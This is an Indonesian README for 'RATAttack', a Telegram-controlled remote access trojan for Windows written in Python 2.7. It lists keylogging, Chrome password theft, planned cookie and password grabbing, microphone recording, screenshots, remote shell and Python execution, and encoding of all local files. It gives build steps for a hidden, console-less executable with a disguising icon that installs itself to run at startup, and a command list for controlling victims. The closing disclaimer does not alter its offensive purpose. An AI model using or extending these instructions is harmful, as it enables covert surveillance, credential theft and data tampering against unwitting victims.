#	Kendali-via-Telegram

Alat Administrasi Jarak Jauh khusus target Windows dan dikendalikan melalui Telegram (Python 2.7) untuk Python 3+ belum

###	Kenapa yang lain?

-	Alat Administrasi Jarak Jauh saat ini di pasar menghadapi 2 masalah utama:

	-	Kurangnya enkripsi.
	-	Memerlukan penerusan port untuk mengontrol dari ratusan mil.

-	Kendali ini mengatasi kedua masalah ini dengan menggunakan API bot Telegram.

	-	Sepenuhnya dienkripsi. Data yang dipertukarkan tidak dapat dimata-matai menggunakan alat MITM.
	-	Aplikasi messenger Telegram menyediakan cara sederhana untuk berkomunikasi dengan target tanpa mengkonfigurasi port maju sebelum tangan pada target.

##	Fitur:
-	Keylogger dengan log judul jendela disertakan
-	Dapatkan versi Windows PC target, prosesor dan banyak lagi
-	Dapatkan informasi alamat IP PC target dan perkiraan lokasi di peta
-	Hapus, Pindahkan file
-	Tampilkan direktori saat ini
-	Ubah direktori saat ini
-	Daftar direktori saat ini atau yang ditentukan
-	Unduh file apa pun dari target
-	Unggah file lokal ke target. Kirim gambar Anda, pdf, exe atau apapun fileke bot Telegram
-	Mulai otomatis memainkan video dalam layar penuh dan tidak ada kontrol untuk video youtube pada target
-	Ambil Tangkapan Layar
-	Jalankan file apa pun
-	Akses ke mikrofon
-	Mulai HTTP Proxy Server
-	Bekukan keyboard target
-	Jadwalkan tugas untuk dijalankan pada waktu yang ditentukan
-	Encode / Decode semua file lokal
-	Target Ping
-	Perbarui .exe
-	Kendali Kendali Kehancuran Diri
-	Ubah wallpaper dari file atau url
-	Jalankan python sewenang-wenang 2.7 di mana saja
-	Jalankan cangkang cmd
-	Pemanggilan login / kata sandi Chrome
-	Tampilkan tabel ARP
-	Dapatkan proses dan layanan aktif
-	Komputer Shutdown / Reboot
-	Tampilkan Cache DNS
[SEDANG BERLANGSUNG] Browser (IE, Firefox, Chrome) pengambilan cookie
[SEDANG BERLANGSUNG] Pengambilan kata sandi
[SEDANG BERLANGSUNG] Pantau lalu lintas web (secara grafis?)
[SEDANG BERLANGSUNG] Skrip fine-tuning (yaitu: jika aplikasi x dibuka y dieksekusi)
[SEDANG BERLANGSUNG] Bekukan mouse target
[SEDANG BERLANGSUNG] Tangkap papan klip (Teks, Gambar)
[SEDANG BERLANGSUNG] Sembunyikan ikon desktop
[SEDANG BERLANGSUNG] Ambil foto dari webcam (jika terpasang)
[SEDANG BERLANGSUNG] Kompresi audio

& Selebihnya datang segera!

##	Tangkapan layar:

<img src="http://i.imgur.com/I5nzrbz.jpg"/>

##	Instalasi & Penggunaan:
-	Klon repositori ini.
-	Mengatur bot Telegram baru yang berbicara dengan 'BotFather'.
-	Salin token ini dan gantilah di awal skrip.
-	Menginstal dependensi: pip install -r requirements.txt.
-	Instal pyHook 64-bitatau 32-bittergantung pada sistem Anda.
-	Untuk 64-bit- pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl.
-	Untuk 32-bit- pip install pyHook-1.5.1-cp27-cp27m-win32.whl.
-	Untuk menjalankan script: python RATAttack.py.
-	Temukan bot Anda di telegram dan kirim beberapa perintah ke bot untuk mengujinya.
-	Untuk membatasi bot sehingga hanya merespons Anda, catat chat_iddari konsol Anda dan ganti dalam skrip dan komentari garis return True. Jangan khawatir, Anda akan tahu kapan Anda membaca komentar di skrip.
<img src="http://i.imgur.com/XKARtrp.png">
- Folder bernama `RATAttack` akan dibuat di direktori kerja Anda yang berisi` keylogs.txt` dan file apa pun yang Anda unggah ke bot.

###	Perintah:
Saat menggunakan perintah di bawah ini; gunakan (Slash) "/" sebagai awalan. Sebagai contoh: /pc_info.

```
/arp - display arp table
/capture_pc - screenshot PC
/cmd_exec - execute shell command
/cp - copy files
/cd - change current directory
/delete - delete a file/folder
/download - download file from target
/decode_all - decode ALL encoded local files
/dns - display DNS Cache
/encode_all - encode ALL local files
/freeze_keyboard - enable keyboard freeze
/unfreeze_keyboard - disable keyboard freeze
/get_chrome - Get Google Chrome's login/passwords
/hear - record microphone
/ip_info - via ipinfo.io
/keylogs - get keylogs
/ls - list contents of current or specified directory
/msg_box - display message box with text
/mv - move files
/pc_info - PC information
/ping - makes sure target is up
/play - plays a youtube video
/proxy - opens a proxy server
/pwd - show current directory
/python_exec - interpret python
/reboot - reboot computer
/run - run a file
/schedule - schedule a command to run at specific time
/self_destruct - destroy all traces
/shutdown - shutdown computer
/tasklist - display services and processes running
/to - select targets by it's name
/update - update executable
/wallpaper - change wallpaper
```
Anda dapat menyalin di atas untuk memperbarui daftar perintah Anda melalui BotFathersehingga Anda tidak perlu mengetiknya secara manual.

##	Kompilasi:
###	Cara Mengompilasi:
####	Antara:
Ganti path Anda di compileAndRun.bat (menjalankan ini benar-benar akan menjalankan eksekusi)
####	Atau:
-	Jalankan `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. 
-	Anda juga bisa menambahkan `--icon=<path\to\icon.ico>` untuk menggunakan ikon kustom apa pun.
-	Setelah berhasil dikompilasi, cari .exefile di dalamnya C:\Python27\Scripts\dist\. Anda dapat mengubah nama dari .exe apa pun yang Anda inginkan.
-	AWAS! Jika Anda menjalankan compiled .exe, script akan menyembunyikan dirinya dan menginfeksi PC Anda untuk dijalankan saat startup. Anda dapat kembali ke normal dengan menggunakan /self_destructopsi atau secara manual menghapus C:\Users\Username\AppData\Roaming\Portaldirektori dan C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk(meskipun saya merekomendasikan untuk menghapusnya secara manual untuk sementara waktu).

###	Memodifikasi Pengaturan:
-	Anda juga dapat memodifikasi nama .exefile tersembunyi dan lokasi & nama folder tempat tersembunyi .exeakan menyembunyikan dirinya. Untuk melakukan ini; memodifikasi compiled_namedan hide_foldermasing - masing.
-	Tetapkan id obrolan Anda yang dikenal ke awal RATAttack.py

##	Catatan:
Saat ini hanya Python2 yang didukung. Dukungan Python3 akan ditambahkan segera!

##	Penolakan:
Alat ini seharusnya hanya digunakan pada sistem yang resmi. Setiap penggunaan tanpa izin dari alat ini tanpa izin eksplisit adalah ilegal.
